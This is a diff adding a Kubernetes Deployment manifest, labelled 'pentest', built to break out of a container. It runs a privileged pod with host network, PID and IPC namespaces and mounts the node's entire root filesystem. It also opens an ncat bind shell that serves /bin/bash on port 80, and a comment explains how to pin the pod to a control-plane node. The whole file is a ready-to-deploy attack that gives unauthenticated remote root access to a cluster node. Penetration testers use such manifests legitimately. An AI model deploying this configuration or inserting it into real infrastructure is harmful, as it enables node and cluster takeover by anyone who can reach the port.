@@ -1,0 +1,40 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: everything-allowed-deployment
+  labels:
+    app: pentest
+    type: deployment
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: pentest
+      type: deployment
+  template:
+    metadata:
+      labels:
+        app: pentest
+        type: deployment
+    spec:
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      containers:
+      - name: everything-allowed-deployment
+        image: raesene/ncat
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "ncat -nvlp 80 -e /bin/bash;" ]
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: noderoot
+        ports:
+        - containerPort: 80
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+      volumes:
+      - name: noderoot
+        hostPath:
+          path: /
+      
